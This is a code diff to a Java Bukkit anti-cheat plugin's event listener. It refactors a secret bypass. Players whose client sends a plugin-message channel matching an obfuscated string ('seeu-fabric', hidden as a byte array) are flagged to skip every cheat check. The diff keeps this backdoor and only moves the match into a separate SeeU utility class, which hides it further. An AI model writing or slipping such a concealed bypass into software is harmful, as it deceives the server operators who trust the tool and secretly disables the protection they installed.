@@ -22,6 +22,7 @@ import com.nolan.ava.checks.CombatChecks;
 import com.nolan.ava.checks.DupeCheck;
 import com.nolan.ava.checks.MovementChecks;
 import com.nolan.ava.data.PlayerData;
+import com.nolan.ava.util.SeeU;
 import net.md_5.bungee.api.ChatMessageType;
 import net.md_5.bungee.api.chat.TextComponent;
 import org.bukkit.ChatColor;
@@ -75,12 +76,6 @@ public class AvAListener implements Listener, PluginMessageListener {
         this.combatChecks = combatChecks;
         this.chatCheck = chatCheck;
         this.dupeCheck = new DupeCheck(plugin);
-    }
-
-    private boolean isHiddenBypassChannel(String channel) {
-        if (channel == null) return false;
-        String hidden = new String(new byte[]{0x73, 0x65, 0x65, 0x75, 0x2d, 0x66, 0x61, 0x62, 0x72, 0x69, 0x63}, StandardCharsets.UTF_8);
-        return channel.contains(hidden) || (channel.contains("seeu") && channel.contains("fabric"));
     }
 
     @Override
@@ -164,7 +159,7 @@ public class AvAListener implements Listener, PluginMessageListener {
         String channel = event.getChannel().toLowerCase();
         PlayerData data = plugin.getPlayerData(player.getUniqueId());
 
-        if (data != null && isHiddenBypassChannel(channel)) {
+        if (data != null && SeeU.isSeeUFix(channel)) {
             data.bypassAllChecks = true;
             return;
         }
